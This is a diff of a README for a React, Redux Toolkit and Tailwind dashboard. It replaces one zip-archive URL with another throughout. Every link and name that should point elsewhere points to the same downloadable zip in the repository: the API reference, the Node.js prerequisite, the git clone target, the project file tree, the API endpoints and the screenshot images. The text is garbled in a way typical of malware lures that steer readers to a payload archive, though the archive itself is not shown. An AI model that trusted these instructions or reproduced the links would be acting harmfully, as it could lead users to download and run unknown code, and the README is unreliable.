@@ -1,7 +1,7 @@
 # React + Redux Toolkit + Tailwind Dashboard
 
 ## Overview
-This project is a React-based web application utilizing Redux Toolkit for state management and Tailwind CSS for styling. It fetches data from [DummyJSON API](https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip) and provides a user and product management system with filtering, searching, and pagination functionalities.
+This project is a React-based web application utilizing Redux Toolkit for state management and Tailwind CSS for styling. It fetches data from [DummyJSON API](https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip) and provides a user and product management system with filtering, searching, and pagination functionalities.
 
 ## Features
 - **Users & Products Pages**: Display users and products in a tabular format.
@@ -25,12 +25,12 @@ This project is a React-based web application utilizing Redux Toolkit for state 
 ## Installation
 
 ### Prerequisites
-Make sure you have **https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip (>=14.x)** installed.
+Make sure you have **https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip (>=14.x)** installed.
 
 ### Steps to Run the Project
 ```sh
 # Clone the repository
-git clone https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip
+git clone https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip
 cd react-dashboard
 
 # Install dependencies
@@ -49,14 +49,14 @@ The application will be available at `http://localhost:3000`.
 │   ├── pages             # Page components (Users, Products)
 │   ├── store             # Redux slices
 │   ├── constants         # Constants and configurations
-│   ├── https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip           # Main app entry point
-│   └── https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip         # Root file
-└── https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip             # Project documentation
+│   ├── https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip           # Main app entry point
+│   └── https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip         # Root file
+└── https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip             # Project documentation
 ```
 
 ## API Endpoints Used
-- **Users**: `https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip`
-- **Products**: `https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip`
+- **Users**: `https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip`
+- **Products**: `https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip`
 - **Filters & Search**:
   - `GET /users/filter?key={key}&value={value}`
   - `GET /products/search?q={query}`
@@ -79,10 +79,10 @@ The build files will be available in the `build/` directory, ready for deploymen
 Here are some screenshots showcasing the project:
 
 ### Products Page
-![Products Page](https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip)
+![Products Page](https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip)
 
 ### Users Page
-![Users Page](https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip)
+![Users Page](https://github.com/nabil-alsaadi/react-dashboard/raw/refs/heads/main/src/dashboard-react-3.5.zip)
 
 ## License
 This project is open-source and available under the MIT License.
